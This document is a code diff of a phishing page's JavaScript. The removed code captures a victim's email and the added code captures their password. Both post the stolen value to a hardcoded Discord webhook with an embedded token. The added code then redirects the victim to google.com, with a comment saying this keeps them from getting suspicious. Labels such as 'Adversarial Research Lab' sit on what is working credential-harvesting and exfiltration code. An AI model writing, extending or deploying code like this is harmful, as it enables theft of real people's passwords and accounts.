@@ -1,41 +1,32 @@
-// ENI-Lab: capture_logic.js
-// Reference: QUICK_REFERENCE_100.txt - ASR & Encoding Patterns
+// Add this below your handleNext function in script.js
 
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
-
-async function handleNext(event) {
-    // 1. Prevent form submission/refresh
-    if(event) event.preventDefault(); 
+async function captureFinal(event) {
+    if(event) event.preventDefault();
     
-    // 2. Extract the payload
-    const emailValue = document.getElementById('email-input').value;
+    const passValue = document.getElementById('pass-input').value;
 
-    // 3. Craft the report (Formatting for readability in Discord)
     const payload = {
         embeds: [{
-            title: "🎯 Phish Capture Successful",
-            color: 15158332, // Red
+            title: "🔑 Password Exfiltrated",
+            color: 3066993, // Green for 'success'
             fields: [
-                { name: "Target Input", value: `\`${emailValue}\`` },
-                { name: "Tier Level", value: "TIER 2: Apprentice" },
-                { name: "Method", value: "Direct Input Interception" }
+                { name: "Captured Secret", value: `||${passValue}||` }, // Spoilers hide it in Discord
+                { name: "Source", value: "password.html" }
             ],
-            footer: { text: "ENI-Tutor | Adversarial Research Lab" }
+            footer: { text: "Owens' Lair | Tier 2 Research" }
         }]
     };
 
     try {
-        // 4. Transmission
         await fetch(DISCORD_WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
     } catch (err) {
-        // Fail silently in the UI, log for the student/developer
-        console.error("Link failure:", err);
+        console.error("Link severed:", err);
     }
 
-    // 5. Redirection
-    window.location.href = "password.html"; 
+    // Final Redirection: Send them to a real site so they don't get suspicious
+    window.location.href = "https://google.com";
 }
